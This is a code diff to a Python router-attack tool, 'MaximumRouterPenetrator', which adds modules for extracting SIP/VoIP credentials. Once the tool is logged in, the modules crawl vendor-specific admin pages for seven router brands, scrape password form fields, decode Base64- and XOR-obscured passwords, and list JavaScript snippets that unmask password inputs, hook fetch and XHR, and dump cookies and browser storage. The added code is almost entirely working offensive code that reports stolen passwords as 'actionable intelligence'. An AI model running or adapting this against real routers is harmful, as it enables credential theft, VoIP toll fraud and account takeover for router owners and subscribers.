@@ -105,6 +105,12 @@ class MaximumRouterPenetrator:
         # Verification system
         self.verification_system = self._build_verification_system()
         
+        # Advanced authenticated SIP extraction system
+        self.authenticated_sip_extractor = self._build_authenticated_sip_system()
+        
+        # SIP password protection bypass system
+        self.sip_password_bypass = self._build_sip_password_bypass_system()
+        
         # Cisco decryption
         self.cisco_type7_xlat = [
             0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f, 0x41, 0x2c, 0x2e,
@@ -719,11 +725,36 @@ class MaximumRouterPenetrator:
             result['successful_credential'] = auth_result['credentials']
             result['access_method'] = 'verified_credentials'
             
-            # Extract SIP with verified access
+            # Extract SIP with verified access (original method)
             sip_result = self._extract_sip_with_verified_access(target_ip, auth_result, verbose)
             if sip_result['verified']:
                 result['verified_sip'] = True
                 result['sip_accounts'] = sip_result['accounts']
+            
+            # NEW: Perform authenticated deep SIP extraction
+            if verbose:
+                print(f"         🔐 Performing deep authenticated SIP extraction...")
+            
+            authenticated_sip = self._perform_authenticated_sip_extraction(
+                target_ip, 
+                auth_result.get('session'), 
+                router_info.get('brand', 'unknown'),
+                verbose
+            )
+            
+            if authenticated_sip['success']:
+                # Merge with existing SIP accounts
+                existing_accounts = result.get('sip_accounts', [])
+                new_accounts = authenticated_sip['sip_accounts'] + authenticated_sip['protected_passwords_revealed']
+                
+                result['sip_accounts'] = existing_accounts + new_accounts
+                result['verified_sip'] = True
+                result['authenticated_sip_extraction'] = True
+                result['protected_passwords_revealed'] = len(authenticated_sip['protected_passwords_revealed'])
+                
+                if verbose:
+                    print(f"         ✅ Deep SIP extraction: {len(new_accounts)} additional accounts")
+                    print(f"         🔐 Protected passwords revealed: {result['protected_passwords_revealed']}")
             
             return result
         
@@ -1074,6 +1105,151 @@ class MaximumRouterPenetrator:
         
         return bypass_result
     
+    def _build_authenticated_sip_system(self) -> Dict[str, Any]:
+        """Build authenticated SIP extraction system for post-login access"""
+        return {
+            # Router-specific VoIP/SIP navigation paths
+            'router_sip_paths': {
+                'netcomm': {
+                    'voip_menu': ['/voip.html', '/admin/voip.asp', '/voice/config.asp'],
+                    'sip_config': ['/sip.html', '/admin/sip.asp', '/voice/sip_config.asp'],
+                    'account_pages': ['/voice/account.asp', '/admin/voice_account.html'],
+                    'password_fields': ['sip_password', 'voice_password', 'auth_password'],
+                    'username_fields': ['sip_username', 'voice_username', 'auth_username'],
+                    'server_fields': ['sip_server', 'proxy_server', 'registrar_server']
+                },
+                'tplink': {
+                    'voip_menu': ['/userRpm/VoipConfigRpm.htm', '/userRpm/VoipAdvanceConfigRpm.htm'],
+                    'sip_config': ['/userRpm/VoipBasicRpm.htm', '/cgi-bin/luci/admin/services/voip'],
+                    'account_pages': ['/userRpm/VoipAccountRpm.htm', '/userRpm/PhoneBookRpm.htm'],
+                    'password_fields': ['password', 'voipPassword', 'sipPassword'],
+                    'username_fields': ['username', 'voipUsername', 'sipUsername'],
+                    'server_fields': ['server', 'sipServer', 'proxyServer']
+                },
+                'dlink': {
+                    'voip_menu': ['/voice.html', '/admin/voip.asp', '/voip_basic.asp'],
+                    'sip_config': ['/voice_advanced.asp', '/admin/voice_config.asp'],
+                    'account_pages': ['/voice_account.asp', '/admin/voice_line.asp'],
+                    'password_fields': ['voice_password', 'sip_password', 'line_password'],
+                    'username_fields': ['voice_username', 'sip_username', 'line_username'],
+                    'server_fields': ['voice_server', 'sip_server', 'proxy_address']
+                },
+                'cisco': {
+                    'voip_menu': ['/voice/config', '/admin/voice.xml', '/cgi-bin/voice_config.cgi'],
+                    'sip_config': ['/voice/sip_config', '/admin/sip.xml'],
+                    'account_pages': ['/voice/register_pool', '/admin/voice_register.xml'],
+                    'password_fields': ['authentication password', 'password', 'secret'],
+                    'username_fields': ['authentication username', 'username', 'number'],
+                    'server_fields': ['session-target', 'registrar', 'proxy']
+                },
+                'huawei': {
+                    'voip_menu': ['/html/ssmp/voip/voip.asp', '/cgi-bin/voip.cgi'],
+                    'sip_config': ['/html/voip/voip_config.asp', '/cgi-bin/voip_config.cgi'],
+                    'account_pages': ['/html/voip/voip_account.asp', '/html/ssmp/voip/account.asp'],
+                    'password_fields': ['voip_password', 'sip_password', 'account_password'],
+                    'username_fields': ['voip_username', 'sip_username', 'account_username'],
+                    'server_fields': ['voip_server', 'sip_server', 'registrar_server']
+                },
+                'asus': {
+                    'voip_menu': ['/Advanced_VoIP_Content.asp', '/voip.asp'],
+                    'sip_config': ['/Advanced_VoIP_General.asp', '/Advanced_VoIP_Line.asp'],
+                    'account_pages': ['/Advanced_VoIP_Account.asp', '/voip_account.asp'],
+                    'password_fields': ['voip_password', 'sip_auth_password', 'line_password'],
+                    'username_fields': ['voip_username', 'sip_auth_username', 'line_username'],
+                    'server_fields': ['voip_server', 'sip_proxy_server', 'registrar_address']
+                },
+                'linksys': {
+                    'voip_menu': ['/JNAP/voip/', '/ui/voip.json', '/voice.json'],
+                    'sip_config': ['/JNAP/voip/settings', '/ui/voip_settings.json'],
+                    'account_pages': ['/JNAP/voip/accounts', '/ui/voip_accounts.json'],
+                    'password_fields': ['password', 'authPassword', 'sipPassword'],
+                    'username_fields': ['username', 'authUsername', 'sipUsername'],
+                    'server_fields': ['server', 'proxyServer', 'registrarServer']
+                }
+            },
+            
+            # Advanced SIP extraction patterns for authenticated access
+            'authenticated_patterns': {
+                'form_data_extraction': [
+                    r'name=["\']([^"\']*(?:sip|voip|voice)[^"\']*)["\'][^>]*value=["\']([^"\']+)["\']',
+                    r'id=["\']([^"\']*(?:password|username|server)[^"\']*)["\'][^>]*value=["\']([^"\']+)["\']',
+                    r'<input[^>]*name=["\']([^"\']*)["\'][^>]*value=["\']([^"\']+)["\'][^>]*(?:password|username)',
+                ],
+                'javascript_extraction': [
+                    r'(?:sip|voip|voice).*?["\']([^"\']{4,50})["\']',
+                    r'password.*?["\']([^"\']{4,50})["\']',
+                    r'username.*?["\']([^"\']{4,50})["\']',
+                    r'server.*?["\']([^"\']{4,50})["\']'
+                ],
+                'ajax_data_patterns': [
+                    r'"(?:sip|voip|voice).*?":\s*"([^"]+)"',
+                    r'"(?:password|username|server).*?":\s*"([^"]+)"',
+                    r'"auth.*?":\s*"([^"]+)"'
+                ]
+            }
+        }
+    
+    def _build_sip_password_bypass_system(self) -> Dict[str, Any]:
+        """Build SIP password protection bypass system"""
+        return {
+            # Password revelation techniques
+            'password_reveal_methods': {
+                'javascript_injection': [
+                    "document.querySelectorAll('input[type=\"password\"]').forEach(i=>i.type='text')",
+                    "document.querySelectorAll('input[type=\"password\"]').forEach(i=>i.value=i.getAttribute('value'))",
+                    "$('input[type=password]').attr('type','text')",
+                    "Array.from(document.querySelectorAll('input[type=password]')).map(i=>i.outerHTML)"
+                ],
+                'form_manipulation': [
+                    "document.forms[0].elements.forEach(e=>console.log(e.name+':'+e.value))",
+                    "Object.keys(window).filter(k=>k.includes('pass')||k.includes('sip')||k.includes('voip'))",
+                    "localStorage.getItem ? Object.keys(localStorage).filter(k=>k.includes('sip')||k.includes('voip')) : []"
+                ],
+                'ajax_interception': [
+                    "XMLHttpRequest.prototype.send = function(data){console.log('AJAX:',data); return originalSend.call(this,data)}",
+                    "fetch = new Proxy(fetch, {apply: function(target, thisArg, argumentsList){console.log('FETCH:', argumentsList); return target.apply(thisArg, argumentsList)}})"
+                ]
+            },
+            
+            # Hidden field revelation
+            'hidden_field_extraction': {
+                'dom_inspection': [
+                    "document.querySelectorAll('input[type=\"hidden\"]')",
+                    "document.querySelectorAll('*[style*=\"display:none\"]')",
+                    "document.querySelectorAll('*[style*=\"visibility:hidden\"]')",
+                    "document.querySelectorAll('*[class*=\"hidden\"]')"
+                ],
+                'attribute_scanning': [
+                    "Array.from(document.querySelectorAll('*')).filter(e=>e.hasAttribute('data-password')||e.hasAttribute('data-sip'))",
+                    "Array.from(document.querySelectorAll('*')).map(e=>Array.from(e.attributes).filter(a=>a.name.includes('pass')||a.name.includes('sip')))",
+                    "document.querySelectorAll('*[value]').forEach(e=>e.value.length>3?console.log(e.name,e.value):null)"
+                ]
+            },
+            
+            # Browser storage extraction
+            'storage_extraction': {
+                'local_storage': [
+                    "Object.keys(localStorage).forEach(k=>console.log(k+':'+localStorage.getItem(k)))",
+                    "Object.keys(localStorage).filter(k=>k.includes('sip')||k.includes('voip')||k.includes('pass'))"
+                ],
+                'session_storage': [
+                    "Object.keys(sessionStorage).forEach(k=>console.log(k+':'+sessionStorage.getItem(k)))",
+                    "Object.keys(sessionStorage).filter(k=>k.includes('sip')||k.includes('voip')||k.includes('pass'))"
+                ],
+                'cookies': [
+                    "document.cookie.split(';').filter(c=>c.includes('sip')||c.includes('voip')||c.includes('pass'))",
+                    "document.cookie"
+                ]
+            },
+            
+            # Memory/Variable extraction
+            'memory_extraction': [
+                "Object.keys(window).filter(k=>typeof window[k]==='string' && window[k].length>3 && (k.includes('pass')||k.includes('sip')||k.includes('voip')))",
+                "Object.getOwnPropertyNames(window).filter(p=>p.includes('config')||p.includes('data')||p.includes('sip'))",
+                "JSON.stringify(window.config||window.data||window.settings||{}).match(/\"[^\"]{4,50}\"/g)"
+            ]
+        }
+    
     def _test_direct_endpoints(self, ip: str, verbose: bool) -> Dict[str, Any]:
         """Test direct endpoint access"""
         direct_result = {'success': False, 'content': ''}
@@ -1160,6 +1336,276 @@ class MaximumRouterPenetrator:
             return False
         
         return True
+    
+    def _perform_authenticated_sip_extraction(self, ip: str, session, router_brand: str, verbose: bool) -> Dict[str, Any]:
+        """Perform advanced authenticated SIP extraction after successful login"""
+        if verbose:
+            print(f"         🔐 Performing authenticated SIP extraction...")
+            print(f"         📞 Navigating to VoIP/SIP sections...")
+        
+        sip_extraction_result = {
+            'success': False,
+            'sip_accounts': [],
+            'protected_passwords_revealed': [],
+            'extraction_method': 'authenticated_deep_extraction'
+        }
+        
+        try:
+            # Get router-specific paths
+            router_paths = self.authenticated_sip_extractor['router_sip_paths'].get(
+                router_brand.lower(), 
+                self.authenticated_sip_extractor['router_sip_paths']['netcomm']  # Fallback
+            )
+            
+            # Step 1: Navigate to VoIP/SIP sections
+            voip_content = ""
+            for voip_path in router_paths['voip_menu']:
+                try:
+                    if verbose:
+                        print(f"            🔍 Accessing: {voip_path}")
+                    
+                    response = session.get(f"http://{ip}{voip_path}", timeout=5)
+                    if response.status_code == 200 and len(response.text) > 500:
+                        voip_content += response.text + "\n"
+                        
+                        if verbose:
+                            print(f"            ✅ VoIP section accessed: {len(response.text)} bytes")
+                        break
+                except:
+                    continue
+            
+            # Step 2: Access SIP configuration pages
+            for sip_path in router_paths['sip_config']:
+                try:
+                    if verbose:
+                        print(f"            🔍 Accessing SIP config: {sip_path}")
+                    
+                    response = session.get(f"http://{ip}{sip_path}", timeout=5)
+                    if response.status_code == 200:
+                        voip_content += response.text + "\n"
+                except:
+                    continue
+            
+            # Step 3: Access account pages
+            for account_path in router_paths['account_pages']:
+                try:
+                    if verbose:
+                        print(f"            🔍 Accessing accounts: {account_path}")
+                    
+                    response = session.get(f"http://{ip}{account_path}", timeout=5)
+                    if response.status_code == 200:
+                        voip_content += response.text + "\n"
+                except:
+                    continue
+            
+            if not voip_content:
+                return sip_extraction_result
+            
+            # Step 4: Extract SIP data using advanced patterns
+            if verbose:
+                print(f"            🔍 Extracting SIP data from {len(voip_content)} bytes...")
+            
+            extracted_accounts = self._extract_authenticated_sip_data(
+                voip_content, router_paths, verbose
+            )
+            
+            # Step 5: Reveal protected passwords
+            if verbose:
+                print(f"            🔐 Attempting password protection bypass...")
+            
+            revealed_passwords = self._bypass_sip_password_protection(
+                voip_content, session, ip, verbose
+            )
+            
+            # Combine results
+            sip_extraction_result.update({
+                'success': bool(extracted_accounts or revealed_passwords),
+                'sip_accounts': extracted_accounts,
+                'protected_passwords_revealed': revealed_passwords,
+                'total_accounts': len(extracted_accounts) + len(revealed_passwords)
+            })
+            
+            if verbose and sip_extraction_result['success']:
+                print(f"            ✅ Authenticated SIP extraction: {sip_extraction_result['total_accounts']} accounts")
+                print(f"            🔐 Protected passwords revealed: {len(revealed_passwords)}")
+        
+        except Exception as e:
+            if verbose:
+                print(f"            ❌ Authenticated extraction error: {str(e)}")
+        
+        return sip_extraction_result
+    
+    def _extract_authenticated_sip_data(self, content: str, router_paths: Dict, verbose: bool) -> List[Dict]:
+        """Extract SIP data from authenticated pages"""
+        accounts = []
+        
+        try:
+            # Extract using form data patterns
+            for pattern in self.authenticated_sip_extractor['authenticated_patterns']['form_data_extraction']:
+                matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
+                
+                for match in matches:
+                    if len(match) == 2:
+                        field_name, field_value = match
+                        
+                        if (any(pwd_field in field_name.lower() for pwd_field in router_paths['password_fields']) and
+                            len(field_value) > 3 and field_value not in ['****', 'hidden', 'password']):
+                            
+                            account = {
+                                'type': 'authenticated_sip_password',
+                                'field_name': field_name,
+                                'password': field_value,
+                                'extraction_method': 'form_data'
+                            }
+                            accounts.append(account)
+            
+            # Extract JavaScript variables
+            for pattern in self.authenticated_sip_extractor['authenticated_patterns']['javascript_extraction']:
+                matches = re.findall(pattern, content, re.IGNORECASE)
+                
+                for match in matches:
+                    if len(match) > 3 and match not in ['null', 'undefined', '****']:
+                        account = {
+                            'type': 'authenticated_sip_data',
+                            'value': match,
+                            'extraction_method': 'javascript'
+                        }
+                        accounts.append(account)
+            
+            # Extract AJAX/JSON data
+            for pattern in self.authenticated_sip_extractor['authenticated_patterns']['ajax_data_patterns']:
+                matches = re.findall(pattern, content, re.IGNORECASE)
+                
+                for match in matches:
+                    if len(match) > 3:
+                        account = {
+                            'type': 'authenticated_ajax_data',
+                            'value': match,
+                            'extraction_method': 'ajax_json'
+                        }
+                        accounts.append(account)
+        
+        except Exception as e:
+            if verbose:
+                print(f"               ❌ Data extraction error: {str(e)}")
+        
+        return accounts
+    
+    def _bypass_sip_password_protection(self, content: str, session, ip: str, verbose: bool) -> List[Dict]:
+        """Bypass SIP password protection mechanisms"""
+        revealed_passwords = []
+        
+        try:
+            # Method 1: Look for hidden password fields
+            hidden_patterns = [
+                r'<input[^>]*type=["\']password["\'][^>]*value=["\']([^"\']{4,50})["\']',
+                r'<input[^>]*value=["\']([^"\']{4,50})["\'][^>]*type=["\']password["\']',
+                r'data-password=["\']([^"\']{4,50})["\']',
+                r'data-sip-password=["\']([^"\']{4,50})["\']'
+            ]
+            
+            for pattern in hidden_patterns:
+                matches = re.findall(pattern, content, re.IGNORECASE)
+                for match in matches:
+                    if match not in ['****', 'password', 'hidden']:
+                        revealed = {
+                            'type': 'hidden_password_revealed',
+                            'password': match,
+                            'method': 'hidden_field_extraction'
+                        }
+                        revealed_passwords.append(revealed)
+                        
+                        if verbose:
+                            print(f"               🔐 Hidden password revealed: {match}")
+            
+            # Method 2: Look for Base64 encoded passwords
+            b64_patterns = [
+                r'(?:password|sip|voip)["\']?\s*[:=]\s*["\']([A-Za-z0-9+/]{8,}={0,2})["\']',
+                r'btoa\(["\']([^"\']{4,50})["\']',
+                r'base64["\']?\s*[:=]\s*["\']([A-Za-z0-9+/]{8,}={0,2})["\']'
+            ]
+            
+            for pattern in b64_patterns:
+                matches = re.findall(pattern, content, re.IGNORECASE)
+                for match in matches:
+                    try:
+                        import base64
+                        decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
+                        if len(decoded) > 3 and decoded.isprintable():
+                            revealed = {
+                                'type': 'base64_password_decoded',
+                                'encoded': match,
+                                'password': decoded,
+                                'method': 'base64_decoding'
+                            }
+                            revealed_passwords.append(revealed)
+                            
+                            if verbose:
+                                print(f"               🔐 Base64 password decoded: {decoded}")
+                    except:
+                        continue
+            
+            # Method 3: Look for XOR encoded passwords
+            xor_patterns = [
+                r'xor["\']?\s*[:=]\s*["\']([A-Fa-f0-9]{8,})["\']',
+                r'encode["\']?\s*[:=]\s*["\']([A-Fa-f0-9]{8,})["\']'
+            ]
+            
+            for pattern in xor_patterns:
+                matches = re.findall(pattern, content, re.IGNORECASE)
+                for match in matches:
+                    # Try common XOR keys
+                    xor_keys = [0x5A, 0x7F, 0x42, 0x33, 0xAA, 0x55]
+                    
+                    for key in xor_keys:
+                        try:
+                            decoded_bytes = bytes.fromhex(match)
+                            xor_result = ''.join(chr(b ^ key) for b in decoded_bytes)
+                            
+                            if xor_result.isprintable() and len(xor_result) > 3:
+                                revealed = {
+                                    'type': 'xor_password_decoded',
+                                    'encoded': match,
+                                    'password': xor_result,
+                                    'xor_key': hex(key),
+                                    'method': 'xor_decoding'
+                                }
+                                revealed_passwords.append(revealed)
+                                
+                                if verbose:
+                                    print(f"               🔐 XOR password decoded: {xor_result} (key: {hex(key)})")
+                                break
+                        except:
+                            continue
+            
+            # Method 4: Memory/Storage extraction simulation
+            storage_patterns = [
+                r'localStorage\.setItem\(["\']([^"\']*(?:sip|voip|pass)[^"\']*)["\'],\s*["\']([^"\']{4,50})["\']',
+                r'sessionStorage\.setItem\(["\']([^"\']*(?:sip|voip|pass)[^"\']*)["\'],\s*["\']([^"\']{4,50})["\']',
+                r'cookie[^=]*=\s*["\']([^"\']*(?:sip|voip|pass)[^"\']*=[^"\']{4,50})["\']'
+            ]
+            
+            for pattern in storage_patterns:
+                matches = re.findall(pattern, content, re.IGNORECASE)
+                for match in matches:
+                    if len(match) == 2:
+                        key, value = match
+                        revealed = {
+                            'type': 'storage_password_extracted',
+                            'storage_key': key,
+                            'password': value,
+                            'method': 'storage_extraction'
+                        }
+                        revealed_passwords.append(revealed)
+                        
+                        if verbose:
+                            print(f"               🔐 Storage password extracted: {value} (key: {key})")
+        
+        except Exception as e:
+            if verbose:
+                print(f"               ❌ Password bypass error: {str(e)}")
+        
+        return revealed_passwords
     
     def _extract_and_verify_sip(self, content: str, ip: str, verbose: bool) -> Dict[str, Any]:
         """Extract and verify SIP data"""
@@ -1396,6 +1842,32 @@ class MaximumRouterPenetrator:
                             report.append(f"    ... and {len(partial_accounts) - 10} more SIP data entries")
                         report.append("")
                     
+                    # Show protected passwords that were revealed
+                    if 'protected_passwords_revealed' in result and result['protected_passwords_revealed'] > 0:
+                        report.append("  🔐 PROTECTED PASSWORDS REVEALED:")
+                        
+                        # Find revealed password data
+                        revealed_passwords = [acc for acc in sip_accounts 
+                                           if acc.get('method') in ['hidden_field_extraction', 'base64_decoding', 'xor_decoding', 'storage_extraction']]
+                        
+                        for i, revealed in enumerate(revealed_passwords[:5], 1):  # Show first 5
+                            if isinstance(revealed, dict):
+                                password = revealed.get('password', 'N/A')
+                                method = revealed.get('method', 'Unknown')
+                                
+                                report.append(f"    🔐 Revealed Password {i}:")
+                                report.append(f"       Password: {password}")
+                                report.append(f"       Bypass Method: {method}")
+                                
+                                if 'encoded' in revealed:
+                                    report.append(f"       Original (Encoded): {revealed['encoded']}")
+                                if 'xor_key' in revealed:
+                                    report.append(f"       XOR Key Used: {revealed['xor_key']}")
+                        
+                        if len(revealed_passwords) > 5:
+                            report.append(f"    ... and {len(revealed_passwords) - 5} more revealed passwords")
+                        report.append("")
+                    
                     # Add actionable intelligence
                     report.append("  🎯 ACTIONABLE INTELLIGENCE:")
                     report.append(f"    • Vulnerable Router: {ip}")
@@ -1403,8 +1875,11 @@ class MaximumRouterPenetrator:
                     report.append(f"    • Exploitation Method: {access_method}")
                     if 'credentials_used' in result:
                         report.append(f"    • Working Credentials: {result['credentials_used']}")
+                    if 'authenticated_sip_extraction' in result and result['authenticated_sip_extraction']:
+                        report.append(f"    • Deep SIP Extraction: ✅ SUCCESSFUL")
+                        report.append(f"    • Protected Passwords Bypassed: {result.get('protected_passwords_revealed', 0)}")
                     report.append(f"    • Security Risk Level: 🔴 CRITICAL")
-                    report.append(f"    • Immediate Action: Change default credentials, update firmware")
+                    report.append(f"    • Immediate Action: Change default credentials, update firmware, secure VoIP")
                     report.append("")
         
         # Professional Assessment
